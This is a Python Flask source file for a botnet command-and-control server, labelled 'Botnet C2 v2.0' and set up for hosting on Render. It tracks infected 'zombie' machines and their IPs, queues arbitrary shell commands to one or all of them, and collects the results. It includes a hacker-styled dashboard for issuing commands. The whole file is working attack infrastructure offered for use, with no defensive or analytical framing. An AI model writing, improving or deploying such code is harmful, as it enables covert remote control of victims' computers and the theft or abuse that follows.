# c2_server.py - Botnet C2 v2.0
# Fixed: Werkzeug import, logging, command queue, Render port

import os
import sys
import json
import time
import logging
from flask import Flask, render_template_string, request, jsonify

# --- Werkzeug compatibility fix ---
try:
    from werkzeug.urls import url_quote
except ImportError:
    from werkzeug.utils import quote as url_quote

# --- Logging setup ---
logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(levelname)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# --- In-memory databases ---
zombies = {}           # zombie_id -> {id, status, os, ram, disk, last_seen, ip}
command_queue = {}     # zombie_id -> command_string
command_results = []   # list of {target, command, output, time}

# --- HTML UI (hardcoded) ---
HTML_UI = '''
<!DOCTYPE html>
<html>
<head>
    <title>☠️ BOTNET C2 v2.0</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #0a0a0a; color: #00ff00; font-family: 'Consolas', 'Courier New', monospace; padding: 20px; }
        .container { max-width: 1400px; margin: 0 auto; }
        .header { border-bottom: 2px solid #00ff00; padding-bottom: 10px; margin-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
        .header h1 { font-size: 24px; text-shadow: 0 0 20px rgba(0,255,0,0.3); }
        .stats { display: grid; grid-template-columns: repeat(4,1fr); gap: 15px; margin-bottom: 20px; }
        .stat-card { background: #111; border: 1px solid #1a1a1a; padding: 15px; border-radius: 4px; }
        .stat-card .label { color: #4a4a4a; font-size: 11px; text-transform: uppercase; letter-spacing: 1px; }
        .stat-card .value { color: #00ff00; font-size: 28px; font-weight: bold; margin-top: 5px; }
        .stat-card .value.offline { color: #ff3333; }
        .cmd-input { display: flex; gap: 10px; margin: 20px 0; flex-wrap: wrap; }
        .cmd-input input, .cmd-input select { background: #111; border: 1px solid #1a1a1a; color: #00ff00; padding: 10px 15px; font-family: 'Consolas', monospace; flex: 1; min-width: 150px; }
        .cmd-input input:focus, .cmd-input select:focus { outline: none; border-color: #00ff00; }
        .cmd-input button { background: #111; border: 1px solid #00ff00; color: #00ff00; padding: 10px 30px; cursor: pointer; font-family: 'Consolas', monospace; transition: all 0.3s; }
        .cmd-input button:hover { background: #00ff00; color: #0a0a0a; }
        .table-wrap { overflow-x: auto; margin-top: 20px; }
        table { width: 100%; border-collapse: collapse; background: #111; font-size: 13px; }
        th { background: #1a1a1a; color: #4a4a4a; padding: 10px 12px; text-align: left; font-weight: normal; text-transform: uppercase; letter-spacing: 1px; font-size: 11px; }
        td { padding: 8px 12px; border-bottom: 1px solid #1a1a1a; }
        tr:hover { background: #1a1a1a; }
        .online { color: #00ff00; }
        .offline { color: #ff3333; }
        .results { background: #111; border: 1px solid #1a1a1a; padding: 15px; margin-top: 20px; max-height: 400px; overflow-y: auto; white-space: pre-wrap; font-family: 'Consolas', monospace; font-size: 13px; }
        .results .entry { border-bottom: 1px solid #1a1a1a; padding: 8px 0; }
        .results .entry .meta { color: #4a4a4a; font-size: 11px; }
        .results .entry .cmd { color: #00ff00; }
        .results .entry .out { color: #c0c0c0; padding-left: 20px; }
        .refresh { background: #111; border: 1px solid #1a1a1a; color: #4a4a4a; padding: 5px 15px; cursor: pointer; font-family: 'Consolas', monospace; }
        .refresh:hover { border-color: #00ff00; color: #00ff00; }
        .footer { margin-top: 30px; text-align: center; color: #4a4a4a; font-size: 11px; border-top: 1px solid #1a1a1a; padding-top: 15px; }
        .badge { display: inline-block; background: #1a1a1a; padding: 2px 10px; border-radius: 3px; font-size: 10px; color: #4a4a4a; }
        @media (max-width: 768px) { .stats { grid-template-columns: 1fr 1fr; } }
    </style>
    <script>
        function refreshStats() {
            fetch('/api/stats').then(r=>r.json()).then(d=>{
                document.getElementById('total').innerText = d.total;
                document.getElementById('online').innerText = d.online;
                document.getElementById('offline').innerText = d.total - d.online;
                document.getElementById('queued').innerText = d.queued || 0;
            });
        }
        function refreshTable() {
            fetch('/api/zombies').then(r=>r.json()).then(d=>{
                let html = '';
                d.forEach(z => {
                    html += `<tr>
                        <td><span class="badge">${z.id}</span></td>
                        <td class="${z.status}">${z.status}</td>
                        <td>${z.os}</td>
                        <td>${z.ram}</td>
                        <td>${z.disk}</td>
                        <td>${z.last_seen}</td>
                        <td>${z.ip}</td>
                    </tr>`;
                });
                document.getElementById('zombie-table').innerHTML = html;
            });
        }
        function refreshResults() {
            fetch('/api/results').then(r=>r.json()).then(d=>{
                let html = '';
                if (d.length === 0) { html = '<div class="entry" style="color:#4a4a4a;">No results yet.</div>'; }
                d.slice().reverse().forEach(r => {
                    html += `<div class="entry">
                        <div class="meta">[${r.time}] <span class="cmd">${r.target}</span></div>
                        <div class="cmd">$ ${r.command}</div>
                        <div class="out">${r.output || '(no output)'}</div>
                    </div>`;
                });
                document.getElementById('results').innerHTML = html;
            });
        }
        function sendCommand() {
            let cmd = document.getElementById('cmd').value;
            let target = document.getElementById('target').value;
            if (!cmd) return;
            fetch('/api/command', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({target: target, command: cmd})
            }).then(() => {
                document.getElementById('cmd').value = '';
                document.getElementById('cmd').focus();
                refreshResults();
                refreshStats();
            });
        }
        function clearResults() {
            fetch('/api/clear_results', {method: 'POST'}).then(() => refreshResults());
        }
        // Auto-refresh every 5 seconds
        setInterval(() => {
            refreshStats();
            refreshTable();
            refreshResults();
        }, 5000);
        window.onload = function() {
            refreshStats();
            refreshTable();
            refreshResults();
            document.getElementById('cmd').addEventListener('keydown', function(e) {
                if (e.key === 'Enter') sendCommand();
            });
        };
    </script>
</head>
<body>
<div class="container">
    <div class="header">
        <h1>☠️ BOTNET C2 v2.0</h1>
        <div>
            <button class="refresh" onclick="refreshStats();refreshTable();refreshResults();">⟳ REFRESH</button>
            <button class="refresh" onclick="clearResults();" style="margin-left:10px;">✕ CLEAR LOG</button>
        </div>
    </div>
    
    <div class="stats">
        <div class="stat-card"><div class="label">Total Zombies</div><div class="value" id="total">0</div></div>
        <div class="stat-card"><div class="label">Online</div><div class="value" id="online">0</div></div>
        <div class="stat-card"><div class="label">Offline</div><div class="value offline" id="offline">0</div></div>
        <div class="stat-card"><div class="label">Commands Queued</div><div class="value" id="queued">0</div></div>
    </div>
    
    <div class="cmd-input">
        <input type="text" id="target" placeholder="Target ID (or * for all)" value="*">
        <input type="text" id="cmd" placeholder="Enter command..." autofocus>
        <button onclick="sendCommand()">▶ EXECUTE</button>
    </div>
    
    <div class="table-wrap">
        <table>
            <thead><tr><th>ID</th><th>Status</th><th>OS</th><th>RAM</th><th>Disk</th><th>Last Seen</th><th>IP</th></tr></thead>
            <tbody id="zombie-table"></tbody>
        </table>
    </div>
    
    <div class="results" id="results">Waiting for output...</div>
    
    <div class="footer">
        ☠️ BOTNET C2 v2.0 – Dark Shell Operations | Powered by Flask
    </div>
</div>
</body>
</html>
'''

# --- ROUTES ---

@app.route('/')
def index():
    return render_template_string(HTML_UI)

@app.route('/api/register', methods=['POST'])
def register():
    data = request.json
    zombie_id = data.get('id')
    if not zombie_id:
        return jsonify({'error': 'missing id'}), 400
    
    # Update or create zombie entry
    zombies[zombie_id] = {
        'id': zombie_id,
        'status': 'online',
        'os': data.get('os', 'unknown'),
        'ram': data.get('ram', '0'),
        'disk': data.get('disk', '0'),
        'last_seen': time.strftime('%Y-%m-%d %H:%M:%S'),
        'ip': request.remote_addr
    }
    logger.info(f"Zombie registered: {zombie_id} from {request.remote_addr}")
    
    # Check if there's a queued command for this zombie
    cmd = command_queue.pop(zombie_id, None)
    if cmd:
        logger.info(f"Delivering queued command to {zombie_id}: {cmd}")
        return jsonify({'command': cmd})
    
    return jsonify({'command': None})

@app.route('/api/result', methods=['POST'])
def result():
    data = request.json
    zombie_id = data.get('id')
    output = data.get('output', '')
    cmd = data.get('command', '')
    
    if zombie_id:
        command_results.append({
            'target': zombie_id,
            'command': cmd,
            'output': output[:5000],  # trim to prevent memory blow
            'time': time.strftime('%Y-%m-%d %H:%M:%S')
        })
        # Keep only last 500 results
        if len(command_results) > 500:
            command_results.pop(0)
        logger.info(f"Result from {zombie_id}: {cmd[:50]}...")
    
    return jsonify({'status': 'ok'})

@app.route('/api/stats')
def stats():
    total = len(zombies)
    online = sum(1 for z in zombies.values() if z['status'] == 'online')
    queued = len(command_queue)
    return jsonify({'total': total, 'online': online, 'queued': queued})

@app.route('/api/zombies')
def list_zombies():
    return jsonify(list(zombies.values()))

@app.route('/api/command', methods=['POST'])
def command():
    data = request.json
    target = data.get('target', '*')
    cmd = data.get('command', '')
    
    if not cmd:
        return jsonify({'error': 'empty command'}), 400
    
    logger.info(f"Command queued: target={target}, cmd={cmd[:50]}...")
    
    if target == '*':
        for zid in zombies:
            command_queue[zid] = cmd
        return jsonify({'status': 'queued', 'targets': len(zombies)})
    else:
        command_queue[target] = cmd
        return jsonify({'status': 'queued', 'target': target})

@app.route('/api/results')
def results():
    return jsonify(command_results)

@app.route('/api/clear_results', methods=['POST'])
def clear_results():
    command_results.clear()
    return jsonify({'status': 'ok'})

@app.route('/api/delete_zombie/<zombie_id>', methods=['DELETE'])
def delete_zombie(zombie_id):
    if zombie_id in zombies:
        del zombies[zombie_id]
        command_queue.pop(zombie_id, None)
        logger.info(f"Zombie deleted: {zombie_id}")
        return jsonify({'status': 'deleted'})
    return jsonify({'error': 'not found'}), 404

# --- HEALTH CHECK (for Render) ---
@app.route('/health')
def health():
    return jsonify({'status': 'alive', 'zombies': len(zombies)})

# --- MAIN ---
if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    logger.info(f"Starting C2 server on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False)
